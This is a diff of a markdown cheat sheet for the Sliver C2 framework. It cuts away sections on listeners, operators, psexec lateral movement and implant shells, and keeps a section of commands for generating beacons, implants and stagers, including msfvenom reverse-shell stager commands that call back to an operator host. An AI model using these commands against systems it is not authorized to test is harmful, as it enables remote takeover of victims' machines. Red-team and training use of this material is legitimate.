@@ -1,245 +1,8 @@
-# Core Commands
+# 04 - Generate Payloads
 
-## 01 - Help Menu
+## 4.1 - Beacons
 
-```
-sliver > help
-
-Commands:
-=========
-  clear       clear the screen
-  exit        exit the shell
-  help        use 'help [command]' for command help
-  monitor     Monitor threat intel platforms for Sliver implants
-  wg-config   Generate a new WireGuard client config
-  wg-portfwd  List ports forwarded by the WireGuard tun interface
-  wg-socks    List socks servers listening on the WireGuard tun interface
-
-
-Generic:
-========
-  aliases           List current aliases
-  armory            Automatically download and install extensions/aliases
-  background        Background an active session
-  beacons           Manage beacons
-  canaries          List previously generated canaries
-  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
-  dns               Start a DNS listener
-  env               List environment variables
-  generate          Generate an implant binary
-  hosts             Manage the database of hosts
-  http              Start an HTTP listener
-  https             Start an HTTPS listener
-  implants          List implant builds
-  jobs              Job control
-  licenses          Open source licenses
-  loot              Manage the server's loot store
-  mtls              Start an mTLS listener
-  prelude-operator  Manage connection to Prelude's Operator
-  profiles          List existing profiles
-  reaction          Manage automatic reactions to events
-  regenerate        Regenerate an implant
-  sessions          Session management
-  settings          Manage client settings
-  stage-listener    Start a stager listener
-  tasks             Beacon task management
-  update            Check for updates
-  use               Switch the active session or beacon
-  version           Display version information
-  websites          Host static content (used with HTTP C2)
-  wg                Start a WireGuard listener
-
-
-Multiplayer:
-============
-  operators  Manage operators
-
-[server] sliver > help
-
-..[snip]..
-
-Multiplayer:
-============
-  kick-operator  Kick an operator from the server
-  multiplayer    Enable multiplayer mode
-  new-operator   Create a new operator config file
-  operators      Manage operators
-```
-
-## 02 - Teamserver
-
-### 2.1 - Multiplayer
-
-#### 2.1.1 - Help Menu
-
-```
-[server] sliver > multiplayer -h
-
-Enable multiplayer mode
-
-Usage:
-======
-  multiplayer [flags]
-
-Flags:
-======
-  -h, --help                 display help
-  -L, --lhost      string    interface to bind server to
-  -l, --lport      int       tcp listen port (default: 31337)
-  -p, --persistent           make persistent across restarts
-```
-
-#### 2.1.2 - Usage
-
-* Reload and start the daemon `sliver.service`
-
-`$ sudo systemctl daemon-reload`
-
-`$ sudo systemctl start sliver`
-
-Or you can manually enable multiplayer mode
-
-`[server] sliver > multiplayer`
-
-`[server] sliver > multiplayer -L <IP> -l <PORT> [-p]`
-
-### 2.2 - Operators
-
-#### 2.2.1 - Add Operators
-
-##### 2.2.1.1 - Help Menu
-
-```
-$ sudo /root/sliver-server operator -h
-Generate operator configuration files
-
-Usage:
-  sliver-server operator [flags]
-
-Flags:
-  -h, --help           help for operator
-  -l, --lhost string   multiplayer listener host
-  -p, --lport uint16   multiplayer listener port (default 31337)
-  -n, --name string    operator name
-  -s, --save string    save file to ...
-
-[server] sliver > new-operator -h
-
-Create a new operator config file
-
-Usage:
-======
-  new-operator [flags]
-
-Flags:
-======
-  -h, --help            display help
-  -l, --lhost string    listen host
-  -p, --lport int       listen port (default: 31337)
-  -n, --name  string    operator name
-  -s, --save  string    directory/file to the binary to
-```
-
-##### 2.2.1.2 - Usage
-
-* Generate operator configuration file
-
-`$ sudo /root/sliver-server operator -l <IP> -p <PORT> -n <operator_name> -s /path/to/directory/`
-
-`[server] sliver > new-operator -l <IP> -p <PORT> -n <operator_name> -s /path/to/directory/`
-
-* Import configuration file with sliver client
-
-`$ sudo chown $USER:$USER file.cfg`
-
-`$ sliver import file.cfg`
-
-#### 2.2.2 - Kick Operators
-
-##### 2.2.2.1 - Help Menu
-
-```
-[server] sliver > kick-operator -h
-
-Kick an operator from the server
-
-Usage:
-======
-  kick-operator [flags]
-
-Flags:
-======
-  -h, --help           display help
-  -n, --name string    operator name
-```
-
-##### 2.2.2.2 - Usage
-
-`[server] sliver > kick-operator -n <operator_name>`
-
-#### 2.2.3 - List Operators
-
-* List operators to check which one is online or offline
-
-`sliver > operators`
-
-## 03 - Shell Handler
-
-### 3.1 - TCP
-
-`sliver > mtls -L <IP> -l <PORT>`
-
-### 3.2 - DNS
-
-`sliver > dns -d <domain>`
-
-### 3.3 - HTTP(S)
-
-#### 3.3.1 - Use custom TLS key and certificate (this is optional but recommended for OPSEC)
-
-- Encrypted TLS key and certification
-
-`$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -sha256 -days 365`
-
-- Non-encrypted TLS key and certification
-
-`$ openssl req -new -x509 -keyout key.pem -out certificate.pem -days 365 -nodes`
-
-`sliver > http [-d <domain.com>] -L <IP> -l <PORT>`
-
-`sliver > https [-d <domain.com>] -L <IP> -l <PORT> -c /path/to/cert.pem -k /path/to/key.pem`
-
-#### 3.3.2 - Disguise the C2 as a website
-
-`sliver > websites add-content -w -p /index.html -c /home/user/nginx_error.html`
-
-`sliver > http -w error [-d <domain.com>] -L <IP> -l <PORT>`
-
-`sliver > websites rm-content -w error -p /index.html`
-
-### 3.4 - SMB
-
-```
-sliver > pivots named-pipe -b <pipe_name>
-
-sliver > profiles new [beacon] [-S <seconds>] [-J <seconds>] -p namedpiped://<compromised_IP>/./pipe/<name_pipe> -l -a x64 -o windows -f service <profile_name>
-
-sliver > psexec -d "<service_description>" -s <service_name> -b C:\path\to\directory -p <profile_name> <target_IP>
-```
-
-* You can use a custom exe
-
-```
-sliver > generate [beacon] [-S <seconds>] [-J <seconds>] -p namedpiped://<compromised_IP>/./pipe/<name_pipe> -a x64 -o windows -f service -s /path/to/folder
-
-sliver > psexec -d "<service_description>" -s <service_name> -b C:\path\to\directory -c /path/to/shellsvc.exe -p <profile_name> <target_IP>
-```
-
-## 04 - Generate Payloads
-
-### 4.1 - Beacons
-
-#### 4.1.1 - Help Menu
+### 4.1.1 - Help Menu
 
 ```
 sliver > generate beacon -h
@@ -292,9 +55,9 @@ Flags:
   -g, --wg                 string    wg connection strings
 ```
 
-#### 4.1.2 - Usage
+### 4.1.2 - Usage
 
-##### 4.1.2.1 - Syntax
+#### 4.1.2.1 - Syntax
 
 * Generate beacons
 
@@ -304,7 +67,7 @@ Flags:
 
 `sliver > generate beacon -a <architecture> -l -S <seconds> -b http[s]://<IP>:<PORT> -o <platform> -f <format> -s /path/to/folder`
 
-##### 4.1.2.2 - Windows
+#### 4.1.2.2 - Windows
 
 * Initial Foothold beacon
 
@@ -314,15 +77,15 @@ Flags:
 
 `sliver > generate beacon -n <IP>//./pipe/<name_pipe> -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory`
 
-##### 4.1.2.3 - Linux
+#### 4.1.2.3 - Linux
 
 `sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | [386 | x86] | arm | arm64 | loong64 | mips | mips64 | mips64le | mipsle | ppc64 | ppc64le | riscv64 | s390x> -o linux -f <exe | shared | shellcode> -s /path/to/directory`
 
-##### 4.1.2.4 - OSX
+#### 4.1.2.4 - OSX
 
 `sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm64> -o darwin -f <exe | shared | shellcode> -s /path/to/directory`
 
-##### 4.1.2.5 - BSD
+#### 4.1.2.5 - BSD
 
 * FreeBSD
 
@@ -336,13 +99,13 @@ Flags:
 
 `sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o openbsd -f exe -s /path/to/directory`
 
-##### 4.1.2.6 - Solaris
+#### 4.1.2.6 - Solaris
 
 `sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64]> -o solaris -f exe -s /path/to/directory`
 
-#### 4.1.3 - Profiles
+### 4.1.3 - Profiles
 
-##### 4.1.3.1 - Help Menu
+#### 4.1.3.1 - Help Menu
 
 ```
 sliver > profiles -h
@@ -414,7 +177,7 @@ Flags:
   -g, --wg                 string    wg connection strings
 ```
 
-##### 4.1.3.2 - Usage
+#### 4.1.3.2 - Usage
 
 * Syntax
 
@@ -422,9 +185,9 @@ Flags:
 
 `sliver > profiles generate <profile>`
 
-### 4.2 - Sessions
+## 4.2 - Sessions
 
-#### 4.2.1 - Help Menu
+### 4.2.1 - Help Menu
 
 ```
 sliver > generate -h
@@ -477,7 +240,7 @@ Sub Commands:
   stager  Generate a stager using Metasploit (requires local Metasploit installation)
 ```
 
-#### 4.2.2 - Usage
+### 4.2.2 - Usage
 
 * Syntax
 
@@ -487,9 +250,9 @@ This beacon will be on interactive (session) mode
 
 `sliver > generate -b http[s]://<IP>:<PORT> -a <architecture> -o <platform> -f <format> -s /path/to/folder`
 
-#### 4.2.3 - Profiles
+### 4.2.3 - Profiles
 
-##### 4.2.3.1 - Help Menu
+#### 4.2.3.1 - Help Menu
 
 ```
 sliver > profiles new -h
@@ -549,7 +312,7 @@ Sub Commands:
   beacon  Create a new implant profile (beacon)
 ```
 
-##### 4.2.3.2 - Usage
+#### 4.2.3.2 - Usage
 
 * Windows
 
@@ -559,9 +322,9 @@ sliver > profiles new -m <IP>:<PORT> -l -a <architecture> -o <platform> -f <form
 sliver > profiles generate <profile_name>
 ```
 
-### 4.3 - Stagers
+## 4.3 - Stagers
 
-#### 4.3.1 - Help Menu
+### 4.3.1 - Help Menu
 
 ```
 sliver > generate stager -h
@@ -634,9 +397,9 @@ Flags:
   -u, --url             string    URL to which the stager will call back to
 ```
 
-#### 4.3.2 - Usage
+### 4.3.2 - Usage
 
-##### 4.3.2.1 - Syntax
+#### 4.3.2.1 - Syntax
 
 * Note: Any listener will work the only detail you should pay attention on the `stage-listener` sliver command
 
@@ -650,7 +413,7 @@ sliver > stage-listener -u <scheme>://<IP>:8080 -p stager-shellcode
 sliver > generate stager -L <IP> -l <PORT> -r <tcp | http | https> -a <x64 | x86> -o <windows | linux | osx> -f <format> -s /path/to/shellcode
 ```
 
-##### 4.3.2.2 - TCP
+#### 4.3.2.2 - TCP
 
 ```
 sliver > mtls -L <IP> -l 4488
@@ -666,7 +429,7 @@ sliver > generate stager -r tcp -L <IP> -l 8080 -a x64 -o windows -f raw -s stag
 
 `$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=8080 -f raw -o staged-sliver.bin`
 
-##### 4.3.2.3 - HTTP
+#### 4.3.2.3 - HTTP
 
 ```
 sliver > https -L <IP> -l 4488
@@ -682,7 +445,7 @@ sliver > generate stager -r http -L <IP> -l 8080 -a x64 -o windows -f raw -s sli
 
 `$ msfvenom -p windows/x64/custom/reverse_winhttp lhost=<IP> lport=8080 luri=/shellcode.woff -f raw -o sliver-http-stager.bin`
 
-##### 4.3.2.4 - HTTPS
+#### 4.3.2.4 - HTTPS
 
 1. Use custom TLS key and certificate (this is optional but recommended for OPSEC)
 
@@ -714,9 +477,9 @@ Or you can generate it with `msfvenom`
 
 `$ msfvenom -p windows/x64/custom/reverse_winhttps lhost=<IP> lport=8080 luri=/shellcode.woff -f raw -o sliver-https-stager.bin`
 
-### 4.4 - Implants
+## 4.4 - Implants
 
-#### 4.4.1 - Help Menu
+### 4.4.1 - Help Menu
 
 ```
 sliver > implants -h
@@ -743,7 +506,7 @@ Sub Commands:
   rm  Remove implant build
 ```
 
-#### 4.4.2 - Usage
+### 4.4.2 - Usage
 
 * **List the implant names**
 
@@ -756,79 +519,3 @@ Sub Commands:
 * **Regenerate implants**
 
 `sliver > regenerate <implant_name>`
-
-## 05 - Armory
-
-### 5.1 - Help Menu
-
-`sliver > armory -h`
-
-### 5.2 - Usage
-
-* Install all armory extensions
-
-`sliver > armory install all`
-
-## 06 - Interactive Session
-
-### 6.1 - Help Menu
-
-`sliver (IMPLANT_NAME) > interactive -h`
-
-### 6.2 - Usage
-
-`sliver (IMPLANT_NAME) > interactive`
-
-`sliver (IMPLANT_NAME) > background`
-
-`sliver > session -i <session_id>`
-
-`sliver (IMPLANT_NAME) >`
-
-### 6.3 - Spawn Shell
-
-#### 6.3.1 - Help Menu
-
-```
-sliver (IMPLANT_NAME) > shell -h
-
-Start an interactive shell
-
-Usage:
-======
-  shell [flags]
-
-Flags:
-======
-  -h, --help                 display help
-  -y, --no-pty               disable use of pty on macos/linux
-  -s, --shell-path string    path to shell interpreter
-  -t, --timeout    int       command timeout in seconds (default: 60)
-```
-
-#### 6.3.2 - Usage
-
-##### 6.3.2.1 - Windows
-
-`sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\system32\\cmd.exe"`
-
-`sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe"`
-
-`sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe"`
-
-##### 6.3.2.2 - Linux
-
-`sliver (IMPLANT_NAME) > shell -y -s /bin/sh`
-
-`sliver (IMPLANT_NAME) > shell -y -s /bin/bash`
-
-`sliver (IMPLANT_NAME) > shell -y -s /bin/zsh`
-
-`sliver (IMPLANT_NAME) > shell -y -s /bin/dash`
-
-`sliver (IMPLANT_NAME) > shell -y -s /bin/fish`
-
----
-## References
-
-* [Sliver](https://github.com/BishopFox/sliver/wiki)
